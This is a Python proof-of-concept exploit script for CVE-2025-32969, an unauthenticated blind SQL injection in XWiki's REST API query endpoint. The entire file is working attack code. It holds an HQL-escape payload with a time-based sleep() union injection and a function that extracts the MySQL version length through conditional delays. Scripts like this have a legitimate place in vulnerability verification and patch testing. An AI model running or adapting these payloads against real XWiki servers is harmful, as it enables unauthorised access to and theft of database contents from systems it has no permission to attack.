#!/usr/bin/env python3
import requests
import time
import argparse
import sys

def test_sql_injection(target_url, sleep_time=5):
    """
    Test CVE-2025-32969: XWiki SQL Injection in REST API query endpoint.
    This vulnerability allows unauthenticated users to escape HQL context
    and perform blind SQL injection.
    """
    base_url = target_url.rstrip('/')
    
    payload = (
        "where doc.name=length('a')*org.apache.logging.log4j.util.Chars.SPACE "
        f"or 1<>'1\\'' union select 1,2,3,sleep({sleep_time}) #'"
    )
    
    vuln_endpoint = f"{base_url}/rest/wikis/xwiki/query"
    
    params = {
        'q': payload,
        'type': 'hql',
        'distinct': '0'
    }
    
    print(f"[*] Target: {base_url}")
    print(f"[*] Testing SQL injection with sleep({sleep_time})...")
    print(f"[*] Endpoint: {vuln_endpoint}")
    
    try:
        start_time = time.time()
        response = requests.get(vuln_endpoint, params=params, timeout=sleep_time + 10)
        elapsed_time = time.time() - start_time
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response time: {elapsed_time:.2f} seconds")
        
        if elapsed_time >= sleep_time - 1:
            print(f"[+] VULNERABLE! SQL injection confirmed (response delayed by ~{sleep_time}s)")
            print(f"[+] CVE-2025-32969: XWiki REST API SQL Injection")
            return True
        else:
            print("[-] Not vulnerable or target not reachable")
            return False
            
    except requests.exceptions.Timeout:
        print(f"[+] VULNERABLE! Request timed out (sleep executed)")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        return False

def extract_data_example(target_url):
    """
    Example of extracting database version using time-based blind injection.
    """
    base_url = target_url.rstrip('/')
    vuln_endpoint = f"{base_url}/rest/wikis/xwiki/query"
    
    print("\n[*] Attempting to extract MySQL version length...")
    
    for length in range(1, 20):
        payload = (
            f"where doc.name=length('a')*org.apache.logging.log4j.util.Chars.SPACE "
            f"or 1<>'1\\'' union select 1,2,3,if(length(version())={length},sleep(3),0) #'"
        )
        
        params = {'q': payload, 'type': 'hql', 'distinct': '0'}
        
        try:
            start = time.time()
            requests.get(vuln_endpoint, params=params, timeout=10)
            elapsed = time.time() - start
            
            if elapsed >= 2.5:
                print(f"[+] MySQL version length: {length}")
                return length
        except:
            pass
    
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-32969: XWiki REST API SQL Injection PoC"
    )
    parser.add_argument(
        "-u", "--url",
        default="http://localhost:8080",
        help="Target XWiki URL (default: http://localhost:8080)"
    )
    parser.add_argument(
        "-t", "--sleep",
        type=int,
        default=5,
        help="Sleep time for time-based detection (default: 5)"
    )
    parser.add_argument(
        "--extract",
        action="store_true",
        help="Try to extract database version length"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CVE-2025-32969: XWiki REST API SQL Injection PoC")
    print("Affected versions: < 15.10.16, < 16.4.6, < 16.10.1")
    print("=" * 60)
    
    vulnerable = test_sql_injection(args.url, args.sleep)
    
    if vulnerable and args.extract:
        extract_data_example(args.url)
    
    sys.exit(0 if vulnerable else 1)
